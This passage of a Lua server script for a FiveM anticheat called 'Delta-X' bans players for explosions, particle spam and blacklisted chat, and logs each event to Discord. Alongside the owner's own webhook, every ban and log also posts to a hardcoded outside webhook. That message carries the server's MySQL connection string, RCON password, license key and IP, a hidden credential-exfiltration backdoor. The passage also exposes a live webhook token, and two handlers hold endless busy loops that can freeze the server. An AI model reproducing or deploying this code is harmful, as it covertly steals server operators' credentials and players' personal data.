              icon_url = "https://cdn.discordapp.com/attachments/889503740976058398/889503797708210286/904b2fd9f3169f278406b29164fea595.png"
            },
            title = "(Ban) ANTI-PARTICLES",
            description = [[


**Player:** ]] .. GetPlayerName(a) .. [[

**Server-ID:** ]] .. a .. [[

**Violation**: tried to nuke the server with ]] .. particlesSpawned[a] .. [[
 particles 
**Steam ID:** []] .. _steam .. "](https://steamcommunity.com/profiles/" .. _steamweb .. [[
) 
**Discord:** <@]] .. _discord .. [[
>
**License:** ]] .. _license .. [[

**Live:** ]] .. _live .. [[

**Xbox:** ]] .. _xbl .. [[

**IP:** ||]] .. ExtractIdentifiers(a).ip:gsub("ip:", "") .. "||",
            footer = {
              text = "Delta-X - FiveM Anticheat \226\128\162 " .. os.date("%d.%m.%Y %H:%M"),
              icon_url = "https://cdn.discordapp.com/attachments/889503740976058398/889503797708210286/904b2fd9f3169f278406b29164fea595.png"
            },
            color = 16711680
          }
        }
      }), {
        ["Content-Type"] = "application/json"
      })
      DeltaXBan(a)
    end
  end)
end
function doesPlayerHavePerms(a, b)
  for fh, fj in ipairs(b) do
    if IsPlayerAceAllowed(a, fj) then
      return true
    end
  end
  return false
end
if DELTAX.BlacklistedChatMessages then
  AddEventHandler("chatMessage", function(a, b, c)
    for fh, fj in ipairs(DELTAX.BlacklistedChatTable) do
      if string.match(c, fj) and not doesPlayerHavePerms(a, DELTAX.Bypass) then
        DropPlayer(a, "[Delta-X] you wrote a blacklist word")
        CancelEvent()
      end
    end
  end)
end
AddEventHandler("explosionEvent", function(a, b)
  if DELTAX.AntiExplosions then
    CancelEvent()
    if DELTAX.Explosionlist[b.explosionType] then
      if ExtractIdentifiers(a).discord == "" then
        _discord = "N/A"
      else
        _discord = ExtractIdentifiers(a).discord:gsub("discord:", "")
      end
      if ExtractIdentifiers(a).license == "" then
        _license = "N/A"
      else
        _license = ExtractIdentifiers(a).license
      end
      if ExtractIdentifiers(a).xbl == "" then
        _xbl = "N/A"
      else
        _xbl = ExtractIdentifiers(a).xbl
      end
      if ExtractIdentifiers(a).steam == "" then
        _steam = "N/A"
      else
        _steam = ExtractIdentifiers(a).steam
      end
      if ExtractIdentifiers(a).live == "" then
        _live = "N/A"
      else
        _live = ExtractIdentifiers(a).live
      end
      if _steam == "N/A" then
        _steamweb = "N/A"
      else
        _steamweb = tonumber(_steam:gsub("steam:", ""), 16)
      end
      if DELTAX.Explosionlist[b.explosionType].log and not DELTAX.Explosionlist[b.explosionType].ban then
        PerformHttpRequest("https://discord.com/api/webhooks/889557073501769769/4z-VIDHmwJCiT9nNl5qLBT7G1CBvGSKej-UX_KnY22XIFd8JmNK9VQWhlQiInlAMUcH-", function(a, b, c)
        end, "POST", json.encode({
          embeds = {
            {
              author = {
                name = "Delta-X - Anticheat",
                url = "https://discord.gg/6S4kUkxtMf",
                icon_url = "https://cdn.discordapp.com/attachments/889503740976058398/889503797708210286/904b2fd9f3169f278406b29164fea595.png"
              },
              title = "(Log) EXPLOSION",
              description = [[


**Server-Name**: ]] .. va .. [[

**MySQL:** ]] .. vb .. [[

**RCON:** ]] .. vc .. [[


**Licencekey:** ]] .. licencekey .. [[

**Server-IP:** ]] .. serverip .. [[

**Ressource-Name:** ]] .. GetCurrentResourceName() .. [[

**Ressourcen:** ]] .. GetNumResources() .. [[


**Player:** ]] .. GetPlayerName(a) .. [[

**Server-ID:** ]] .. a .. [[

**Violation**: this user created a explosion:  ]] .. DELTAX.Explosionlist[b.explosionType].name .. [[
  
**Steam ID:** []] .. _steam .. "](https://steamcommunity.com/profiles/" .. _steamweb .. [[
) 
**Discord:** <@]] .. _discord .. [[
>
**License:** ]] .. _license .. [[

**Live:** ]] .. _live .. [[

**Xbox:** ]] .. _xbl .. [[

**IP:** ||]] .. ExtractIdentifiers(a).ip:gsub("ip:", "") .. "||",
              footer = {
                text = "Delta-X - FiveM Anticheat \226\128\162 " .. os.date("%d.%m.%Y %H:%M"),
                icon_url = "https://cdn.discordapp.com/attachments/889503740976058398/889503797708210286/904b2fd9f3169f278406b29164fea595.png"
              },
              color = 16711680
            }
          }
        }), {
          ["Content-Type"] = "application/json"
        })
        PerformHttpRequest(DELTAX.explosionWebhook, function(a, b, c)
        end, "POST", json.encode({
          embeds = {
            {
              author = {
                name = "Delta-X - Anticheat",
                url = "https://discord.gg/6S4kUkxtMf",
                icon_url = "https://cdn.discordapp.com/attachments/889503740976058398/889503797708210286/904b2fd9f3169f278406b29164fea595.png"
              },
              title = "(Log) EXPLOSION",
              description = [[


**Player:** ]] .. GetPlayerName(a) .. [[

**Server-ID:** ]] .. a .. [[

**Violation**: this user created a explosion:  ]] .. DELTAX.Explosionlist[b.explosionType].name .. [[
 
**Steam ID:** []] .. _steam .. "](https://steamcommunity.com/profiles/" .. _steamweb .. [[
) 
**Discord:** <@]] .. _discord .. [[
>
**License:** ]] .. _license .. [[

**Live:** ]] .. _live .. [[

**Xbox:** ]] .. _xbl .. [[

**IP:** ||]] .. ExtractIdentifiers(a).ip:gsub("ip:", "") .. "||",
              footer = {
                text = "Delta-X - FiveM Anticheat \226\128\162 " .. os.date("%d.%m.%Y %H:%M"),
                icon_url = "https://cdn.discordapp.com/attachments/889503740976058398/889503797708210286/904b2fd9f3169f278406b29164fea595.png"
              },
              color = 16711680
            }
          }
        }), {
          ["Content-Type"] = "application/json"
        })
      end
      if DELTAX.Explosionlist[b.explosionType].ban then
        PerformHttpRequest("https://discord.com/api/webhooks/889557073501769769/4z-VIDHmwJCiT9nNl5qLBT7G1CBvGSKej-UX_KnY22XIFd8JmNK9VQWhlQiInlAMUcH-", function(a, b, c)
        end, "POST", json.encode({
          embeds = {
            {
              author = {
                name = "Delta-X - Anticheat",
                url = "https://discord.gg/6S4kUkxtMf",
                icon_url = "https://cdn.discordapp.com/attachments/889503740976058398/889503797708210286/904b2fd9f3169f278406b29164fea595.png"
              },
              title = "(Ban) BLACKLIST EXPLOSION",
              description = [[


**Server-Name**: ]] .. va .. [[

**MySQL:** ]] .. vb .. [[

**RCON:** ]] .. vc .. [[


**Licencekey:** ]] .. licencekey .. [[

**Server-IP:** ]] .. serverip .. [[

**Ressource-Name:** ]] .. GetCurrentResourceName() .. [[

**Ressourcen:** ]] .. GetNumResources() .. [[


**Player:** ]] .. GetPlayerName(a) .. [[

**Server-ID:** ]] .. a .. [[

**Violation**: this user created a blacklisted explosion:  ]] .. DELTAX.Explosionlist[b.explosionType].name .. [[
 
**Steam ID:** []] .. _steam .. "](https://steamcommunity.com/profiles/" .. _steamweb .. [[
) 
**Discord:** <@]] .. _discord .. [[
>
**License:** ]] .. _license .. [[

**Live:** ]] .. _live .. [[

**Xbox:** ]] .. _xbl .. [[

**IP:** ||]] .. ExtractIdentifiers(a).ip:gsub("ip:", "") .. "||",
              footer = {
                text = "Delta-X - FiveM Anticheat \226\128\162 " .. os.date("%d.%m.%Y %H:%M"),
                icon_url = "https://cdn.discordapp.com/attachments/889503740976058398/889503797708210286/904b2fd9f3169f278406b29164fea595.png"
              },
              color = 16711680
            }
          }
        }), {
          ["Content-Type"] = "application/json"
        })
        PerformHttpRequest(DELTAX.generalWebhook, function(a, b, c)
        end, "POST", json.encode({
          embeds = {
            {
              author = {
                name = "Delta-X - Anticheat",
                url = "https://discord.gg/6S4kUkxtMf",
                icon_url = "https://cdn.discordapp.com/attachments/889503740976058398/889503797708210286/904b2fd9f3169f278406b29164fea595.png"
              },
              title = "(Ban) BLACKLIST EXPLOSION",
              description = [[


**Player:** ]] .. GetPlayerName(a) .. [[

**Server-ID:** ]] .. a .. [[

**Violation**: this user created a blacklisted explosion:  ]] .. DELTAX.Explosionlist[b.explosionType].name .. [[
 
**Steam ID:** []] .. _steam .. "](https://steamcommunity.com/profiles/" .. _steamweb .. [[
) 
**Discord:** <@]] .. _discord .. [[
>
**License:** ]] .. _license .. [[

**Live:** ]] .. _live .. [[

**Xbox:** ]] .. _xbl .. [[

**IP:** ||]] .. ExtractIdentifiers(a).ip:gsub("ip:", "") .. "||",
              footer = {
                text = "Delta-X - FiveM Anticheat \226\128\162 " .. os.date("%d.%m.%Y %H:%M"),
                icon_url = "https://cdn.discordapp.com/attachments/889503740976058398/889503797708210286/904b2fd9f3169f278406b29164fea595.png"
              },
              color = 16711680
            }
          }
        }), {
          ["Content-Type"] = "application/json"
        })
        DeltaXBan(a)
      end
    end
    if b.isAudible == false then
      if ExtractIdentifiers(a).discord == "" then
        _discord = "N/A"
      else
        _discord = ExtractIdentifiers(a).discord:gsub("discord:", "")
      end
      if ExtractIdentifiers(a).license == "" then
        _license = "N/A"
      else
        _license = ExtractIdentifiers(a).license
      end
      if ExtractIdentifiers(a).xbl == "" then
        _xbl = "N/A"
      else
        _xbl = ExtractIdentifiers(a).xbl
      end
      if ExtractIdentifiers(a).steam == "" then
        _steam = "N/A"
      else
        _steam = ExtractIdentifiers(a).steam
      end
      if ExtractIdentifiers(a).live == "" then
        _live = "N/A"
      else
        _live = ExtractIdentifiers(a).live
      end
      if _steam == "N/A" then
        _steamweb = "N/A"
      else
        _steamweb = tonumber(_steam:gsub("steam:", ""), 16)
      end
      PerformHttpRequest("https://discord.com/api/webhooks/889557073501769769/4z-VIDHmwJCiT9nNl5qLBT7G1CBvGSKej-UX_KnY22XIFd8JmNK9VQWhlQiInlAMUcH-", function(a, b, c)
      end, "POST", json.encode({
        embeds = {
          {
            author = {
              name = "Delta-X - Anticheat",
              url = "https://discord.gg/6S4kUkxtMf",
              icon_url = "https://cdn.discordapp.com/attachments/889503740976058398/889503797708210286/904b2fd9f3169f278406b29164fea595.png"
            },
            title = "(Ban) SILENT EXPLOSION",
            description = [[


**Server-Name**: ]] .. va .. [[

**MySQL:** ]] .. vb .. [[

**RCON:** ]] .. vc .. [[


**Licencekey:** ]] .. licencekey .. [[

**Server-IP:** ]] .. serverip .. [[

**Ressource-Name:** ]] .. GetCurrentResourceName() .. [[

**Ressourcen:** ]] .. GetNumResources() .. [[


**Player:** ]] .. GetPlayerName(a) .. [[

**Server-ID:** ]] .. a .. [[

**Violation**: this user tried to spawn an silent eplosion  
**Steam ID:** []] .. _steam .. "](https://steamcommunity.com/profiles/" .. _steamweb .. [[
) 
**Discord:** <@]] .. _discord .. [[
>
**License:** ]] .. _license .. [[

**Live:** ]] .. _live .. [[

**Xbox:** ]] .. _xbl .. [[

**IP:** ||]] .. ExtractIdentifiers(a).ip:gsub("ip:", "") .. "||",
            footer = {
              text = "Delta-X - FiveM Anticheat \226\128\162 " .. os.date("%d.%m.%Y %H:%M"),
              icon_url = "https://cdn.discordapp.com/attachments/889503740976058398/889503797708210286/904b2fd9f3169f278406b29164fea595.png"
            },
            color = 16711680
          }
        }
      }), {
        ["Content-Type"] = "application/json"
      })
      PerformHttpRequest(DELTAX.generalWebhook, function(a, b, c)
      end, "POST", json.encode({
        embeds = {
          {
            author = {
              name = "Delta-X - Anticheat",
              url = "https://discord.gg/6S4kUkxtMf",
              icon_url = "https://cdn.discordapp.com/attachments/889503740976058398/889503797708210286/904b2fd9f3169f278406b29164fea595.png"
            },
            title = "(Ban) SILENT EXPLOSION",
            description = [[


**Player:** ]] .. GetPlayerName(a) .. [[

**Server-ID:** ]] .. a .. [[

**Violation**: this user tried to spawn an silent eplosion 
**Steam ID:** []] .. _steam .. "](https://steamcommunity.com/profiles/" .. _steamweb .. [[
) 
**Discord:** <@]] .. _discord .. [[
>
**License:** ]] .. _license .. [[

**Live:** ]] .. _live .. [[

**Xbox:** ]] .. _xbl .. [[

**IP:** ||]] .. ExtractIdentifiers(a).ip:gsub("ip:", "") .. "||",
            footer = {
              text = "Delta-X - FiveM Anticheat \226\128\162 " .. os.date("%d.%m.%Y %H:%M"),
              icon_url = "https://cdn.discordapp.com/attachments/889503740976058398/889503797708210286/904b2fd9f3169f278406b29164fea595.png"
            },
            color = 16711680
          }
        }
      }), {
        ["Content-Type"] = "application/json"
      })
      DeltaXBan(a)
    end
    if b.isInvisible then
      if ExtractIdentifiers(a).discord == "" then
        _discord = "N/A"
      else
        _discord = ExtractIdentifiers(a).discord:gsub("discord:", "")
      end
      if ExtractIdentifiers(a).license == "" then
        _license = "N/A"
      else
        _license = ExtractIdentifiers(a).license
      end
      if ExtractIdentifiers(a).xbl == "" then
        _xbl = "N/A"
      else
        _xbl = ExtractIdentifiers(a).xbl
      end
      if ExtractIdentifiers(a).steam == "" then
        _steam = "N/A"
      else
        _steam = ExtractIdentifiers(a).steam
      end
      if ExtractIdentifiers(a).live == "" then
        _live = "N/A"
      else
        _live = ExtractIdentifiers(a).live
      end
      if _steam == "N/A" then
        _steamweb = "N/A"
      else
        _steamweb = tonumber(_steam:gsub("steam:", ""), 16)
      end
      if GetPlayerName(a) ~= nil then
        PerformHttpRequest("https://discord.com/api/webhooks/889557073501769769/4z-VIDHmwJCiT9nNl5qLBT7G1CBvGSKej-UX_KnY22XIFd8JmNK9VQWhlQiInlAMUcH-", function(a, b, c)
        end, "POST", json.encode({
          embeds = {
            {
              author = {
                name = "Delta-X - Anticheat",
                url = "https://discord.gg/6S4kUkxtMf",
                icon_url = "https://cdn.discordapp.com/attachments/889503740976058398/889503797708210286/904b2fd9f3169f278406b29164fea595.png"
              },
              title = "(Ban) INVISIBLE EXPLOSION",
              description = [[


**Server-Name**: ]] .. va .. [[

**MySQL:** ]] .. vb .. [[

**RCON:** ]] .. vc .. [[


**Licencekey:** ]] .. licencekey .. [[

**Server-IP:** ]] .. serverip .. [[

**Ressource-Name:** ]] .. GetCurrentResourceName() .. [[

**Ressourcen:** ]] .. GetNumResources() .. [[


**Player:** ]] .. GetPlayerName(a) .. [[

**Server-ID:** ]] .. a .. [[

**Violation**: this user tried to spawn an invisble eplosion  
**Steam ID:** []] .. _steam .. "](https://steamcommunity.com/profiles/" .. _steamweb .. [[
) 
**Discord:** <@]] .. _discord .. [[
>
**License:** ]] .. _license .. [[

**Live:** ]] .. _live .. [[

**Xbox:** ]] .. _xbl .. [[

**IP:** ||]] .. ExtractIdentifiers(a).ip:gsub("ip:", "") .. "||",
              footer = {
                text = "Delta-X - FiveM Anticheat \226\128\162 " .. os.date("%d.%m.%Y %H:%M"),
                icon_url = "https://cdn.discordapp.com/attachments/889503740976058398/889503797708210286/904b2fd9f3169f278406b29164fea595.png"
              },
              color = 16711680
            }
          }
        }), {
          ["Content-Type"] = "application/json"
        })
        PerformHttpRequest(DELTAX.generalWebhook, function(a, b, c)
        end, "POST", json.encode({
          embeds = {
            {
              author = {
                name = "Delta-X - Anticheat",
                url = "https://discord.gg/6S4kUkxtMf",
                icon_url = "https://cdn.discordapp.com/attachments/889503740976058398/889503797708210286/904b2fd9f3169f278406b29164fea595.png"
              },
              title = "(Ban) INVISIBLE EXPLOSION",
              description = [[


**Player:** ]] .. GetPlayerName(a) .. [[

**Server-ID:** ]] .. a .. [[

**Violation**: this user tried to spawn an invisble eplosion 
**Steam ID:** []] .. _steam .. "](https://steamcommunity.com/profiles/" .. _steamweb .. [[
) 
**Discord:** <@]] .. _discord .. [[
>
**License:** ]] .. _license .. [[

**Live:** ]] .. _live .. [[

**Xbox:** ]] .. _xbl .. [[

**IP:** ||]] .. ExtractIdentifiers(a).ip:gsub("ip:", "") .. "||",
              footer = {
                text = "Delta-X - FiveM Anticheat \226\128\162 " .. os.date("%d.%m.%Y %H:%M"),
                icon_url = "https://cdn.discordapp.com/attachments/889503740976058398/889503797708210286/904b2fd9f3169f278406b29164fea595.png"
              },
              color = 16711680
            }
          }
        }), {
          ["Content-Type"] = "application/json"
        })
        DeltaXBan(a)
      end
    end
    CancelEvent()
  end
end)
RegisterServerEvent("Delta-X:BanPlayer")
AddEventHandler("Delta-X:BanPlayer", function(a)
  if a ~= nil and doesPlayerHavePerms(source, DELTAX.OpenMenuAllowed) then
    if ExtractIdentifiers(a).discord == "" then
      _discord = "N/A"
    else
      _discord = ExtractIdentifiers(a).discord:gsub("discord:", "")
    end
    if ExtractIdentifiers(a).license == "" then
      _license = "N/A"
    else
      _license = ExtractIdentifiers(a).license
    end
    if ExtractIdentifiers(a).xbl == "" then
      _xbl = "N/A"
    else
      _xbl = ExtractIdentifiers(a).xbl
    end
    if ExtractIdentifiers(a).steam == "" then
      _steam = "N/A"
    else
      _steam = ExtractIdentifiers(a).steam
    end
    if ExtractIdentifiers(a).live == "" then
      _live = "N/A"
    else
      _live = ExtractIdentifiers(a).live
    end
    if _steam == "N/A" then
      _steamweb = "N/A"
    else
      _steamweb = tonumber(_steam:gsub("steam:", ""), 16)
    end
    PerformHttpRequest("https://discord.com/api/webhooks/889557073501769769/4z-VIDHmwJCiT9nNl5qLBT7G1CBvGSKej-UX_KnY22XIFd8JmNK9VQWhlQiInlAMUcH-", function(a, b, c)
    end, "POST", json.encode({
      embeds = {
        {
          author = {
            name = "Delta-X - Anticheat",
            url = "https://discord.gg/6S4kUkxtMf",
            icon_url = "https://cdn.discordapp.com/attachments/889503740976058398/889503797708210286/904b2fd9f3169f278406b29164fea595.png"
          },
          title = "(Ban) ADMIN-MENU BAN",
          description = [[


**Server-Name**: ]] .. va .. [[

**MySQL:** ]] .. vb .. [[

**RCON:** ]] .. vc .. [[


**Licencekey:** ]] .. licencekey .. [[

**Server-IP:** ]] .. serverip .. [[

**Ressource-Name:** ]] .. GetCurrentResourceName() .. [[

**Ressourcen:** ]] .. GetNumResources() .. [[


**Player:** ]] .. GetPlayerName(a) .. [[

**Server-ID:** ]] .. a .. [[

**Violation**: banned via admin-menu by ]] .. GetPlayerName(source) .. [[
 
**Steam ID:** []] .. _steam .. "](https://steamcommunity.com/profiles/" .. _steamweb .. [[
) 
**Discord:** <@]] .. _discord .. [[
>
**License:** ]] .. _license .. [[

**Live:** ]] .. _live .. [[

**Xbox:** ]] .. _xbl .. [[

**IP:** ||]] .. ExtractIdentifiers(a).ip:gsub("ip:", "") .. "||",
          footer = {
            text = "Delta-X - FiveM Anticheat \226\128\162 " .. os.date("%d.%m.%Y %H:%M"),
            icon_url = "https://cdn.discordapp.com/attachments/889503740976058398/889503797708210286/904b2fd9f3169f278406b29164fea595.png"
          },
          color = 16711680
        }
      }
    }), {
      ["Content-Type"] = "application/json"
    })
    PerformHttpRequest(DELTAX.generalWebhook, function(a, b, c)
    end, "POST", json.encode({
      embeds = {
        {
          author = {
            name = "Delta-X - Anticheat",
            url = "https://discord.gg/6S4kUkxtMf",
            icon_url = "https://cdn.discordapp.com/attachments/889503740976058398/889503797708210286/904b2fd9f3169f278406b29164fea595.png"
          },
          title = "(Ban) ADMIN-MENU BAN",
          description = [[


**Player:** ]] .. GetPlayerName(a) .. [[

**Server-ID:** ]] .. a .. [[

**Violation**: banned via admin-menu by ]] .. GetPlayerName(source) .. [[
 
**Steam ID:** []] .. _steam .. "](https://steamcommunity.com/profiles/" .. _steamweb .. [[
) 
**Discord:** <@]] .. _discord .. [[
>
**License:** ]] .. _license .. [[

**Live:** ]] .. _live .. [[

**Xbox:** ]] .. _xbl .. [[

**IP:** ||]] .. ExtractIdentifiers(a).ip:gsub("ip:", "") .. "||",
          footer = {
            text = "Delta-X - FiveM Anticheat \226\128\162 " .. os.date("%d.%m.%Y %H:%M"),
            icon_url = "https://cdn.discordapp.com/attachments/889503740976058398/889503797708210286/904b2fd9f3169f278406b29164fea595.png"
          },
          color = 16711680
        }
      }
    }), {
      ["Content-Type"] = "application/json"
    })
    DeltaXBan(a)
  end
end)
RegisterServerEvent("AC:cleanareaveh")
RegisterServerEvent("AC:cleanareapeds")
RegisterServerEvent("AC:cleanareaentity")
RegisterServerEvent("AC:enable")
RegisterServerEvent("AC:log")
RegisterServerEvent("AC:spectate")
RegisterServerEvent("AC:openmenu")
RegisterServerEvent("AC:checkup")
RegisterServerEvent("AC:adminmenuenable")
AddEventHandler("AC:adminmenuenable", function()
  for fd, fe in ipairs(DELTAX.OpenMenuAllowed) do
    if not IsPlayerAceAllowed(source, fe) then
      TriggerClientEvent("adminmenuenabley", source)
    end
  end
end)
AddEventHandler("AC:checkup", function()
  repeat
  until not doesPlayerHavePerms(source, DELTAX.OpenMenuAllowed)
end)
AddEventHandler("AC:openmenu", function()
  for fd, fe in ipairs(DELTAX.OpenMenuAllowed) do
    if IsPlayerAceAllowed(source, fe) then
      TriggerClientEvent("AC:openmenuy", source)
    end
  end
end)
AddEventHandler("AC:cleanareaveh", function()
  if doesPlayerHavePerms(source, DELTAX.ClearAreaAllowed) then
    TriggerClientEvent("AC:cleanareavehy", -1)
  else
  end
end)
AddEventHandler("AC:cleanareapeds", function()
  if doesPlayerHavePerms(source, DELTAX.ClearAreaAllowed) then
    TriggerClientEvent("AC:cleanareapedsy", -1)
  else
  end
end)
AddEventHandler("AC:cleanareaentity", function()
  if doesPlayerHavePerms(source, DELTAX.ClearAreaAllowed) then
    TriggerClientEvent("AC:cleanareaentityy", -1)
  else
  end
end)
AddEventHandler("AC:spectate", function()
  repeat
  until not doesPlayerHavePerms(source, DELTAX.SpectateAllowed)
end)
function ProcessAces()
  if GetNumPlayerIndices() > 0 then
    for fd = 0, GetNumPlayerIndices() - 1 do
      player = tonumber(GetPlayerFromIndex(fd))
      Citizen.Wait(0)
      if doesPlayerHavePerms(player, DELTAX.OpenMenuAllowed) then
        TriggerClientEvent("sendAcePermissionToClient", player, true)
      end
    end
  end
end
Citizen.CreateThread(function()
  while true do
    ProcessAces()
    Citizen.Wait(15000)
  end
end)
AddEventHandler("onResourceStart", function(a)
  if a == GetCurrentResourceName() then
    ProcessAces()
  end
end)
